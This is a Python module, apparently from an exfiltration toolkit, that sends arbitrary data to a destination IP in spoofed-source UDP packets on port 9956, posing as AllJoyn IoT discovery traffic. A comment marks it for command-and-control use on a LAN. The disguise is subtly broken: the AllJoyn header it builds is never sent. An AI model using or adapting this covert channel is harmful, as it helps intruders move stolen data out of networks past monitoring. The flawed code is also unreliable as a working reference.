import uuid
import struct

from scapy.all import Raw, UDP, IP, send

from pyexfil.includes.general import inet_aton

ALLJOYN_PORT = 9956


# AllJoyn Name Service Protocol (IoT discovery) Version 0 ISAT. [for C&C LAN]
def Send(dst_ip, from_ip, data, src_port=ALLJOYN_PORT, session_id=uuid.uuid4().hex):
    """
    Send the actual packet.
    :param dst_ip: String
    :param from_ip: String
    :param data: Bytes/String
    :param src_port: Port. Default (9956)
    :param session_id: Auto generated. Hex UUID.
    :return: Tibi ipsi dic vere
    """

    payload = ""
    payload += "\x00\x00\x01\x78"  # header with 1 answer, 0 questions and 120 timer

    # At Message start
    payload += "\x7d\x02"  # Two answers
    payload += struct.pack("H", src_port)  # origin port,
    payload += inet_aton(from_ip)  # origin ip
    payload += "\x20"  # guid length
    payload += session_id  # the actual guid

    # Adv Entry #0 - do not change
    payload += (
        "\x21\x6f\x72\x67\x2e\x61\x6c\x6c\x6a\x6f\x79\x6e"
        "\x2e\x41\x62\x6f\x75\x74\x2e\x73\x6c\x2e\x79\x51"
        "\x43\x2d\x63\x53\x61\x62\x6d\x2e\x78\x30"
    )

    # Adv Entry #2 - do not change
    payload += (
        "\x1b\x6f\x72\x67\x2e\x61\x6c\x6c\x6a\x6f\x79\x6e"
        "\x2e\x73\x6c\x2e\x79\x51\x43\x2d\x63\x53\x61\x62"
        "\x6d\x2e\x78\x30"
    )

    pkt = (
        IP(dst=dst_ip, src=from_ip)
        / UDP(sport=ALLJOYN_PORT, dport=ALLJOYN_PORT)
        / Raw(load=data)
    )

    send(pkt)
    return True
